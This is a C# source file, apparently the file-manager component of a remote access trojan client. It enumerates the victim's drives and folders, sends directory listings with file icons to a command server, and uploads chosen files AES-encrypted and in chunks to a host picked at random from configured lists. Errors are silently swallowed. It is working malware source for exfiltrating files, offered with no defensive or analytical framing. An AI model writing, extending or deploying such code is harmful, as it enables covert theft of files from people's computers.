using Client.MessagePack;
using Client.Sockets;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Net.Sockets;
namespace Client.Handle_Packet
{
    class FileManager
    {

        public void GetDrivers()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "fileManager";
            msgpack.ForcePathObject("Command").AsString = "getDrivers";
            StringBuilder sbDriver = new StringBuilder();
            foreach (DriveInfo d in allDrives)
            {
                if (d.IsReady)
                {
                    sbDriver.Append(d.Name + "-=>" + d.DriveType + "-=>");
                }
                msgpack.ForcePathObject("Driver").AsString = sbDriver.ToString();
                ClientSocket.BeginSend(msgpack.Encode2Bytes());
            }
        }

        public void GetPath(string path)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "fileManager";
            msgpack.ForcePathObject("Command").AsString = "getPath";
            StringBuilder sbFolder = new StringBuilder();
            StringBuilder sbFile = new StringBuilder();

            foreach (string folder in Directory.GetDirectories(path))
            {
                sbFolder.Append(Path.GetFileName(folder) + "-=>" + Path.GetFullPath(folder) + "-=>");
            }
            foreach (string file in Directory.GetFiles(path))
            {
                Icon icon = Icon.ExtractAssociatedIcon(file);
                Bitmap bmpIcon = icon.ToBitmap();
                long length = new FileInfo(file).Length;
                using (MemoryStream ms = new MemoryStream())
                {
                    bmpIcon.Save(ms, ImageFormat.Png);
                    sbFile.Append(Path.GetFileName(file) + "-=>" + Path.GetFullPath(file) + "-=>" + Convert.ToBase64String(ms.ToArray()) + "-=>" + length.ToString() + "-=>");
                }
            }
            msgpack.ForcePathObject("Folder").AsString = sbFolder.ToString();
            msgpack.ForcePathObject("File").AsString = sbFile.ToString();
            ClientSocket.BeginSend(msgpack.Encode2Bytes());
        }

        public void DownnloadFile(string file, string dwid)
        {
            try
            {
                Socket Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                    ReceiveTimeout = -1,
                    SendTimeout = -1,
                };
                Client.Connect(Convert.ToString(Settings.Host.Split(',')[new Random().Next(Settings.Host.Split(',').Length)]),
                    Convert.ToInt32(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]));

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "socketDownload";
                msgpack.ForcePathObject("Command").AsString = "pre";
                msgpack.ForcePathObject("DWID").AsString = dwid;
                msgpack.ForcePathObject("File").AsString = file;
                long Length = new FileInfo(file).Length;
                msgpack.ForcePathObject("Size").AsString = Length.ToString();
                ChunkSend(Settings.aes256.Encrypt(msgpack.Encode2Bytes()), Client);


                MsgPack msgpack2 = new MsgPack();
                msgpack2.ForcePathObject("Packet").AsString = "socketDownload";
                msgpack2.ForcePathObject("Command").AsString = "save";
                msgpack2.ForcePathObject("DWID").AsString = dwid;
                msgpack2.ForcePathObject("Name").AsString = Path.GetFileName(file);
                msgpack2.ForcePathObject("File").LoadFileAsBytes(file);
                ChunkSend(Settings.aes256.Encrypt(msgpack2.Encode2Bytes()), Client);

                Client.Shutdown(SocketShutdown.Both);
                Client.Close();
            }
            catch
            {
                return;
            }
        }

        private void ChunkSend(byte[] Msg, Socket Client)
        {
            try
            {
                byte[] buffersize = BitConverter.GetBytes(Msg.Length);
                Client.Poll(-1, SelectMode.SelectWrite);
                Client.Send(buffersize);

                int chunkSize = 50 * 1024;
                byte[] chunk = new byte[chunkSize];
                int SendPackage;
                using (MemoryStream buffereReader = new MemoryStream(Msg))
                {
                    BinaryReader binaryReader = new BinaryReader(buffereReader);
                    int bytesToRead = (int)buffereReader.Length;
                    do
                    {
                        chunk = binaryReader.ReadBytes(chunkSize);
                        bytesToRead -= chunkSize;
                        SendPackage = Client.Send(chunk);
                    } while (bytesToRead > 0);

                    binaryReader.Close();
                }
            }
            catch
            {
                return;
            }
        }
    }
}
